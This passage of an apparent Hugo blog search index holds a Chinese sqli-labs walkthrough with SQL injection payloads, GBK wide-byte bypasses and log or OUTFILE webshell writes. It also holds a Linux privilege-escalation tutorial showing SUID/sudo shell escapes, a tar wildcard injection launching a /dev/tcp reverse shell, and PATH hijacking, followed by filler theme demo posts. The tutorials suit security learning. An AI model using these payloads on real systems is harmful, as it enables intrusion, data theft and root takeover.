$id1=java_implimentation($qs); $id=$_GET[\u0026#39;id\u0026#39;]; whitelist($id1); $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; function whitelist($input) { # 匹配数字 \t$match = preg_match(\u0026#34;/^\\d+$/\u0026#34;, $input); if 不是数字： 重定向到失败页面; } # HTTP 参数污染 function java_implimentation($query_string) { $q_s = $query_string; # 以\u0026#39;\u0026amp;\u0026#39;为分隔符分割字符串 \t$qs_array= explode(\u0026#34;\u0026amp;\u0026#34;,$q_s); # 遍历分割好的参数数组 \tforeach($qs_array as $key =\u0026gt; $value) { $val=substr($value,0,2); # 如果前两位是id \tif($val==\u0026#34;id\u0026#34;) { # 从第3位开始，返回长度为30的字符穿 \t$id_value=substr($value,3,30); return $id_value; break; } } }    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    分析 流程：服务端获取到查询字符串id=1\u0026amp;...，随后截取参数id的值用于白名单过滤，如果匹配数字则继续执行，否则重定向到失败页面\n但是问题出在以下：\n 用于sql查询的id值是通过GET方式获取的，该服务端默认认为从GET方式获取的id值与用于解析白名单过滤的id值是同一个 对于xxx.php?id=1\u0026amp;id=2这样的同名参数污染，apache PHP会解析获取最后一个参数值，即为2；tomcat JSP会解析获取到第一个参数值，即为1  因此，利用方式如下：?id=1\u0026amp;id=-1\u0026rsquo; union\u0026hellip;..\nLess-30    拼接点 可用注入类型     双引号 UNION、显错、bool盲、延时盲    与Less-29一致\nLess-31    拼接点 可用注入类型     双引号+单括号 UNION、显错、bool盲、延时盲    与Less-29一致\nLess-32 function check_addslashes($string) { # 转义\\  $string = preg_replace(\u0026#39;/\u0026#39;. preg_quote(\u0026#39;\\\\\u0026#39;) .\u0026#39;/\u0026#39;, \u0026#34;\\\\\\\\\\\\\u0026#34;, $string); # 转义单引号  $string = preg_replace(\u0026#39;/\\\u0026#39;/i\u0026#39;, \u0026#39;\\\\\\\u0026#39;\u0026#39;, $string); # 转义双引号  $string = preg_replace(\u0026#39;/\\\u0026#34;/\u0026#39;, \u0026#34;\\\\\\\u0026#34;\u0026#34;, $string); return $string; } $id=check_addslashes($_GET[\u0026#39;id\u0026#39;]); mysql_query(\u0026#34;SET NAMES gbk\u0026#34;); $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;;    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    绕过 使用 GBK 编码MySQL会认为两个字节为一个汉字，例如 %aa%5e 即为一个 汉字\n由于转义是在敏感字符前加\\，\\'即%5c%27，那可以在\\'前加上%df，转义后结果为：%df\\\\\\'，这样MySQL使用GBK会认为%df%5c为一个汉字，即为汉字\\\\'，则汉字后的两个反斜杠实际在送往sql语句时表示的仅仅只是一个单纯的反斜杠，不再具有转义作用，此时单引号便起到了闭合作用\nLess-33 function check_addslashes($string) { $string= addslashes($string); return $string; } 转义方法与Less-32类似\n   拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    绕过方式与Less-32一致\n补充 gbk编码造成的宽字符注入问题，解决方法是设置character_set_client=binary\n原理\nMySQL编码机制\nmysql_query(\u0026#34;SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary\u0026#34;, $conn); character_set_client：用户告诉MySQL查询是用的什么字符集。 character_set_connection：MySQL接收到用户查询后，按照character_set_client将其转化为character_set_connection设定的字符集 character_set_results：MySQL将存储的数据转换成character_set_results所设定的字符集发送给用户\n完整可理解为：MySQL接受到客户端的数据后，会认为他的编码是character_set_client，然后会将换成character_set_connection的编码，然后在进入具体表和字段后，再转换成字段对应的编码，当查询结果产生后，会从表和字段编码转换成character_set_results编码，返回给客户端\nLess-34    拼接点 可用注入类型     POST-单引号 UNION、显错、bool盲、延时盲    与Less-33类似\nLess-35 $id=check_addslashes($_GET[\u0026#39;id\u0026#39;]); function check_addslashes($string) { $string = addslashes($string); return $string; } $sql=\u0026#34;SELECT * FROM users WHERE id=$idLIMIT 0,1\u0026#34;;    拼接点 可用注入类型     直接拼接 UNION、显错、bool盲、延时盲    虽然有转义过滤，但是sql语句是直接拼接，所以不需要引号闭合等\nLess-36 function check_quotes($string) { $string= mysql_real_escape_string($string); return $string; }    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    与Less-33的过滤方式类似，绕过方法类似\nLess-37    拼接点 可用注入类型     POST-单引号 UNION、显错、bool盲、延时盲    与Less-36类似\nLess-38(堆叠注入) 堆叠 多条语句一起执行\n原理 MySQL 中，主要是命令行中，每条语句结尾加 ; 表示语句结束。这样可以考虑闭合已有语句，从而执行多条 SQL 语句\n注意\n UNION 执行的语句类型是有限的—查询语句；而堆叠注入可以执行任意语句\n并不是每一个环境下都可以执行堆叠，很可能受 API 、数据库引擎不支持、权限不足的限制\n在真实环境中通常只返回一个查询结果，因此，堆叠注入第二个语句可能产生错误或者结果被忽略，即在前端界面是无法看到返回结果的；在使用堆叠注入之前需要知道一些数据库相关信息的，例如表名，列名等信息\n if (mysqli_multi_query($con1, $sql)) // 执行多个查询有结果 { /* store first result set */ if ($result = mysqli_store_result($con1)) { if($row = mysqli_fetch_row($result)) { echo \u0026#39;\u0026lt;font size = \u0026#34;5\u0026#34; color= \u0026#34;#00FF00\u0026#34;\u0026gt;\u0026#39;;\tprintf(\u0026#34;Your Username is : %s\u0026#34;, $row[1]); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; printf(\u0026#34;Your Password is : %s\u0026#34;, $row[2]); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } // mysqli_free_result($result);  } /* print divider */ if (mysqli_more_results($con1)) // 是否有更多结果  { //printf(\u0026#34;-----------------\\n\u0026#34;);  } //while (mysqli_next_result($con1)); }    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲、堆叠    后续利用 堆叠注入可以执行任意SQL语句，那么就可以进行开启日志getshell\n前提：\n 有web目录的物理路径 MySQL用户可以对web目录有读写权限  payload：\nid=1';set global general_log = \u0026quot;On\u0026quot;;set global general_log_file='/var/www/html/shell.php';--+\rid=1';select \u0026lt;?php phpinfo(); ?\u0026gt;;--+\r访问shell.php即可\n 本题开启日志getshell尝试过程中，发现set global general_log_file='/var/www/html/shell.php'一直执行失败，原因是：/var/目录不属于mysql用户，无法设置成功，进入容器修改目录权限即可执行成功\n Less-39    拼接点 可用注入类型     直接拼 UNION、显错、bool盲、延时盲、堆叠    与Less-38类似\nLess-40 拼接方式：单引号 + 括号\n其余与Less-38类似\nLess-41 拼接方式：直接拼\n注入类型：无法报错注入\n其余与Less-39类似\nLess-42 login.php:\n$username = mysqli_real_escape_string($con1, $_POST[\u0026#34;login_user\u0026#34;]); $password = $_POST[\u0026#34;login_password\u0026#34;]; $sql = \u0026#34;SELECT * FROM users WHERE username=\u0026#39;$username\u0026#39; and password=\u0026#39;$password\u0026#39;\u0026#34;; mysqli_multi_query($con1, $sql)) if 查询成功： return $row[1]; else: print_r(mysqli_error($con1)); if 登录成功: setcookie(\u0026#34;Auth\u0026#34;, 1, time()+3600); 跳转到 logged-in.php logged-in.php:\n提供修改密码功能\npass_change.php：\nif 未登录: 重定向 index.php if 修改密码表单: $username = $_SESSION[\u0026#34;username\u0026#34;]; $curr_pass = mysql_real_escape_string($_POST[\u0026#39;current_password\u0026#39;]); $pass = mysql_real_escape_string($_POST[\u0026#39;password\u0026#39;]); $re_pass = mysql_real_escape_string($_POST[\u0026#39;re_password\u0026#39;]); if $pass == $re_pass: $sql = \u0026#34;UPDATE users SET PASSWORD=\u0026#39;$pass\u0026#39; where username=\u0026#39;$username\u0026#39; and password=\u0026#39;$curr_pass\u0026#39; \u0026#34;; 分析 第一处漏洞发生在登录时的password未过滤，可进行报错、堆叠、union等注入\n第二处漏洞发生在update更新密码时对从session中获得的用户名未做过滤，利用方式与Less-24类似\nLess-43 拼接方式：POST + 单引号 + 但括号\n其余与Less-42类似\nLess-44 拼接方式：单引号\n注入类型：少了报错\n其余与Less-43类似\nLess-45 注入类型：少了报错\n其余与Less-43类似\nLess-46 $id=$_GET[\u0026#39;sort\u0026#39;]; $sql = \u0026#34;SELECT * FROM users ORDER BY $id\u0026#34;; if 查询成功： 输出查询结果 else： print_r(mysql_error()); 注入位置发生在order by 子句上\n探测方式 更换id发现排序方式不同，可能是用不同的列进行排序\n升降 # 升序\r?sort=1 asc\r# 降序\r?sort=1 desc\rrand()函数 ?sort=rand(true)\r?sort=rand(false)\r二者返回结果不一样，且是固定的，因此可进行布尔、延时盲注\n延时探测 ?sort=sleep(1)\r?sort=(sleep(1))\r?sort=1 and sleep(1)\r返回时间为查询结果行数 * 1 秒\n利用 报错 ?sort=1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)\r# 利用procedure analyse 参数报错\r?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)\r盲注 ?sort=rand(left(database(),1)='s')\r# 延时\r?sort=rand(if(ascii(substr(database(),1,1))=115,1,sleep(1)))\rinto outfile 直接导出(注意需要有写权限)：\n?sort=1 into outfile \u0026quot;/var/www/html/less46.txt\u0026quot;\rgetshell：\n?sort=1 into outfile \u0026quot;/var/www/html/shell.php\u0026quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e\r限定每一行以0x3c3f70687020706870696e666f28293b3f3e(\u0026lt;?php phpinfo();?\u0026gt;的十六进制编码)为结尾\n\rimage\r\nLess-47 拼接方式：单引号\n其余与Less-46类似\nLess-48 注入类型：少了报错\n其余与Less-46类似\nLess-49 注入类型：少了报错\n其余与Less-47类似\nLess-50 注入类型：可以堆叠注入\n其余与Less-46类似\nLess-51-53 与Less50类似，只是在在注入类型和拼接方式上有变化\nLess-54 index.php：\nif $_GET['id']:\r计数器加1；\rif 计数器超过10次：\r提示失败\r$sql=\u0026quot;SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\u0026quot;;\rif 有查询成功:\r输出查询信息\relse：\rpass\r$key = addslashes($_POST['key']);\r$key = mysql_real_escape_string($key);\r$sql=\u0026quot;SELECT 1 FROM $table WHERE $col1= '$key'\u0026quot;;\r要求从challenges数据库中10次得到secret key\n利用 判断闭合：\n?id=1' --+\r可用union注入\r判断字段数目：\n?id=1' order by 3--+\r?id=1' order by 4--+\r结果为3\r判断可注入的字段位置：\n?id=-1' union select 1,2,3 --+\r2和3可以\r查询表名：\n?id=-1' union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA='challenges') --+\r表名F6ZVUD1OQV\r查询列名：\n?id=-1' union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='F6ZVUD1OQV')--+\rid,sessid,secret_MJF9,tryy\r查目标结果：\n?id=-1' union select 1,2,(SELECT+GROUP_CONCAT(secret_MJF9)+FROM+F6ZVUD1OQV)--+\r5p85ATWNXGEvh89AXJ4GteMe\rLess-55-57 与Less-54类似，只是在闭合方式上有变化\nLess-58 与Less-54相比，这一关在输出信息时不是直接将查询结果返回，而是根据查询结果中的id字段从硬编码数组中取信息，这样union注入就无用了\n但是又输出了报错信息，因此可利用报错注入\nLess-59-65 与Less58类似，只是在闭合方式和注入类型少有区别\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/sql/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://coollllllll.github.io/p/sql/","title":"SQL注入相关"},{"content":"正文测试 而这些并不是完全重要，更加重要的问题是， 带着这些问题，我们来审视一下学生会退会。 既然如何， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 我们不得不面对一个非常尴尬的事实，那就是， 可是，即使是这样，学生会退会的出现仍然代表了一定的意义。 学生会退会，发生了会如何，不发生又会如何。 经过上述讨论， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 学生会退会，到底应该如何实现。 这样看来， 在这种困难的抉择下，本人思来想去，寝食难安。 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 就我个人来说，学生会退会对我的意义，不能不说非常重大。 莎士比亚曾经提到过，人的一生是短的，但如果卑劣地过这一生，就太长了。这似乎解答了我的疑惑。 莫扎特说过一句富有哲理的话，谁和我一样用功，谁就会和我一样成功。这启发了我， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 学生会退会，到底应该如何实现。 一般来说， 从这个角度来看， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 在这种困难的抉择下，本人思来想去，寝食难安。 了解清楚学生会退会到底是一种怎么样的存在，是解决一切问题的关键。 一般来说， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 问题的关键究竟为何？ 而这些并不是完全重要，更加重要的问题是。\n奥斯特洛夫斯基曾经说过，共同的事业，共同的斗争，可以使人们产生忍受一切的力量。　带着这句话，我们还要更加慎重的审视这个问题： 一般来讲，我们都必须务必慎重的考虑考虑。 既然如此， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 带着这些问题，我们来审视一下学生会退会。 我认为， 我认为， 在这种困难的抉择下，本人思来想去，寝食难安。 问题的关键究竟为何？ 每个人都不得不面对这些问题。 在面对这种问题时， 要想清楚，学生会退会，到底是一种怎么样的存在。 我认为， 既然如此， 每个人都不得不面对这些问题。 在面对这种问题时， 那么， 我认为， 学生会退会因何而发生。\n引用  思念是最暖的忧伤像一双翅膀\n让我停不了飞不远在过往游荡\n不告而别的你 就算为了我着想\n这么沉痛的呵护 我怎么能翱翔\n最暖的憂傷 - 田馥甄\n 图片 \rPhoto by Florian Klauer on Unsplash\r \rPhoto by Luca Bravo on Unsplash\r\n\rPhoto by Helena Hertz on Unsplash\r \rPhoto by Hudai Gayiran on Unsplash\r\n\rhahahah\r\n![Photo by Florian Klauer on Unsplash](florian-klauer-nptLmg6jqDo-unsplash.jpg) ![Photo by Luca Bravo on Unsplash](luca-bravo-alS7ewQ41M8-unsplash.jpg) ![Photo by Helena Hertz on Unsplash](helena-hertz-wWZzXlDpMog-unsplash.jpg) ![Photo by Hudai Gayiran on Unsplash](hudai-gayiran-3Od_VKcDEAA-unsplash.jpg) 相册语法来自 Typlog\n","date":"2020-09-09T00:00:00Z","image":"https://coollllllll.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu45a5e3ad5e058da6a00650ed8fd40bea_15530_120x120_fill_q75_box_smart1.jpg","permalink":"https://coollllllll.github.io/p/test-chinese/","title":"Chinese Test"},{"content":"Linux提权 suid和sudo提权 suid SUID，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Tom)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权。\n一个程序执行时会有三个id状态，分别如下：\n Real User ID：执行这个程序的用户的真实id，以用户登录时候的id为准 Effective User ID：是程序执行过程中使用权限时真正起作用的用户id，操作系统在检查一个程序有没有某个权限的时候会查看该id Saved User ID：程序临时提权时需要保存的先前的用户id，等提权结束后需要回退到这个用户id  suid用途 如果用户Tom有另一个用户root的程序的执行权限，并且root给这个程序设置了SUID位，那么Tom就可以用root的权限来执行这个程序\n遍历suid文件 find / -perm -u=s 2\u0026gt;/dev/null\r\rimage-20211013091410929\r\n设置suid # 设置suid位\rchmod 4xxx filename\r# 设置sgid位\rchmod 2xxx filename\r# 设置suid和sgid位\rchmod 6xxx filename\r其中xxx指的是文件的一般读写执行权限\r取消suid # 取消suid和sgid\rchmod xxx filename\r# 取消suid或sgid\rchmod u-s filename or chmod g-s filename\r注意 suid位只对编译过的可执行程序起作用，比如给某一个sh脚本赋予suid位置，而sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的suid位，就不会起作用了\nsuid提权姿势 find find . -exec /bin/sh -p \\; -quit\r 注意:前提都是find可执行文件具备suid\n 其他类似的：https://gtfobins.github.io/\nsudo sudo权限是把本来只能超级用户执行的命令赋予普通用户执行\n要配置sudo，需要修改/etc/sudoers\n# sudoers文件对某个用户或用户组的sudo配置\r授权用户/组 主机 =[(切换到哪些用户或组)] [是否需要输入密码验证] 命令1,命令2,...\r字段1 字段2 字段3 字段4 字段5\r# 字段1\r不以%开头表示授权用户； 以%开头表示授权用户组\r# 字段2\r表示允许登录的主机；ALL表示所有;如果该字段不为ALL,表示授权用户只能在某些机器上登录本服务器来执行sudo命令\r# 字段3\r如果省略, 相当于(root:root)，表示可以通过sudo提权到root; 如果为(ALL)或者(ALL:ALL), 表示能够提权到(任意用户:任意用户组)\r# 字段4\r可能取值是NOPASSWD:，注意NOPASSWD后面带有冒号:，表示执行sudo时可以不需要输入密码\r# 字段5\r用逗号分开一系列命令，ALL表示允许所有操作\rsudo -l可查看自己的sudo配置\n\rimage-20211012170101086\r\nsudo提权姿势 sudo /usr/bin/awk 'BEGIN {system(\u0026quot;/bin/sh\u0026quot;)}'\rsudo find . -exec /bin/sh \\; -quit\r\rimage-20211012170437130\r\n其他类似sudo提权命令:https://gtfobins.github.io/\n通配符提权  该类提权一般都配合计划任务，发现计划任务使用了相关命令通配符\n 通配符 *：匹配任意数量字符\n?：匹配任意单个字符\n[]：一组字符，其中任意一个字符都可匹配该位置单个字符\n~：单个表示当前用户主目录名称，~后跟用户名表示某用户根目录名称\n示例 示例1 test目录下有2个文件\ncool@cool-virtual-machine:~/test$ ls\rtest2 test.txt\r执行cat *\ncool@cool-virtual-machine:~/test$ cat *\rsadadada\rhahahah\r创建\u0026ndash;help文件\ncool@cool-virtual-machine:~/test$ echo \u0026quot;my help\u0026quot; \u0026gt; --help\rcool@cool-virtual-machine:~/test$ ls\r--help test2 test.txt\r再次执行cat *\ncool@cool-virtual-machine:~/test$ cat *\rUsage: cat [OPTION]... [FILE]...\rConcatenate FILE(s) to standard output.\rWith no FILE, or when FILE is -, read standard input.\r-A, --show-all equivalent to -vET\r-b, --number-nonblank number nonempty output lines, overrides -n\r-e equivalent to -vE\r-E, --show-ends display $ at end of each line\r-n, --number number all output lines\r-s, --squeeze-blank suppress repeated empty output lines\r可观察到并没有读取\u0026quot;\u0026ndash;help\u0026quot;文件的内容，而是被视为\u0026quot;cat\u0026quot;命令的\u0026ndash;help命令帮助选项\n这种可称为**\u0026ldquo;wildcard wildness\u0026rdquo;**\n示例2 在test目录下生成反弹shell脚本\ncool@cool-virtual-machine:~/test$ echo \u0026quot;/bin/sh -i\u0026gt;\u0026amp;/dev/tcp/127.0.0.1/7777 0\u0026gt;\u0026amp;1\u0026quot; \u0026gt; shell.sh\rcool@cool-virtual-machine:~/test$ ls\rshell.sh\r生成如下文件\ncool@cool-virtual-machine:~/test$ echo \u0026quot;\u0026quot; \u0026gt; \u0026quot;--checkpoint-action=exec=sh shell.sh\u0026quot;\rcool@cool-virtual-machine:~/test$ echo \u0026quot;\u0026quot; \u0026gt; \u0026quot;--checkpoint=1\u0026quot;\rcool@cool-virtual-machine:~/test$ ls\r--checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh\r监听端口\ncool@cool-virtual-machine:~$ nc -nvlp 7777\rListening on [0.0.0.0] (family 0, port 7777)\r执行tar命令\ncool@cool-virtual-machine:~/test$ tar cf /tmp/test.tar *\r监听结果\ncool@cool-virtual-machine:~$ nc -nvlp 7777\rListening on [0.0.0.0] (family 0, port 7777)\rConnection from [127.0.0.1] port 7777 [tcp/*] accepted (family 2, sport 36508)\rsh-4.3$ id\rid\ruid=1000(cool) gid=1000(cool) groups=1000(cool),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\r注意\n tar命令的通配符注入需要进入到目标目录，使用通配符\u0026quot;*\u0026quot;，例如 tar -cf /tmp/test.tar *\n使用绝对路径，如：tar -cf /tmp/test.tar /tmp/test/*, 那么\u0026ndash;checkpoint等会失效，无法执行命令\n 敏感文件 Path 环境变量劫持 system函数会调用shell(sh)执行命令(传入的参数)\n现有这样一段可执行程序，如：\n#include\u0026lt;unistd.h\u0026gt;\rvoid main()\r{\rsetuid(0);\rsetgid(0);\rsystem(\u0026quot;whoami\u0026quot;);\r}\r以root用户编译后生成“haha”可执行文件如下(具有suid位)：\nroot@cool-virtual-machine:/home/cool/test# ll\rtotal 40\rdrwxrwxr-x 2 cool cool 4096 10月 25 10:56 ./\rdrwxr-xr-x 27 cool cool 4096 10月 25 09:29 ../\r-rwsr-xr-x 1 root root 8656 10月 25 10:56 haha*\r以普通用户编译这样一段程序：\n#include\u0026lt;unistd.h\u0026gt;\rvoid main()\r{\rsystem(\u0026quot;/bin/bash\u0026quot;);\r}\r生成\u0026quot;whoami\u0026quot;文件：\ncool@cool-virtual-machine:~/test$ ll\rtotal 40\rdrwxrwxr-x 2 cool cool 4096 10月 25 11:00 ./\rdrwxr-xr-x 27 cool cool 4096 10月 25 09:29 ../\r-rwsr-xr-x 1 root root 8656 10月 25 10:56 haha*\r-rw-rw-r-- 1 cool cool 86 10月 25 10:56 test.c\r-rwxrwxr-x 1 cool cool 8608 10月 25 10:50 whoami*\r劫持环境变量：\ncool@cool-virtual-machine:~/test$ export PATH=/home/cool/test:$PATH\rcool@cool-virtual-machine:~/test$ which whoami\r/home/cool/test/whoami\r执行./haha：\ncool@cool-virtual-machine:~/test$ ./haha\rroot@cool-virtual-machine:~/test# id\ruid=0(root) gid=1000(cool) groups=1000(cool),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\r","date":"2020-09-09T00:00:00Z","image":"https://coollllllll.github.io/p/1/luca-bravo-alS7ewQ41M8-unsplash_hu0a3f1163de68d0b9471979ebf0ecf11e_32400_120x120_fill_q75_box_smart1.jpg","permalink":"https://coollllllll.github.io/p/1/","title":"Linux提权学习"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.— Rob Pike1 Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Italics Bold Code     italics bold code    Code Blocks Code block with backticks \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r Code block with Hugo\u0026rsquo;s internal highlight shortcode \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Fruit  Apple Orange Banana   Dairy  Milk Cheese    Other Elements — abbr, sub, sup, kbd, mark GIFis a bitmap image format.\nH2O\nXn+ Yn= ZnPress CTRL+ALT+Deleteto end the session.\nMost salamandersare nocturnal, and hunt for insects, worms, and other small creatures.\n  The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","date":"2019-03-11T00:00:00Z","image":"https://coollllllll.github.io/p/markdown-syntax-guide/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://coollllllll.github.io/p/markdown-syntax-guide/","title":"Markdown Syntax Guide"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\n N.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n.emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; }","date":"2019-03-05T00:00:00Z","image":"https://coollllllll.github.io/p/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_huf941de4769045cdfa8c9ee7036519a2a_35369_120x120_fill_q75_box_smart1.jpg","permalink":"https://coollllllll.github.io/p/emoji-support/","title":"Emoji Support"}]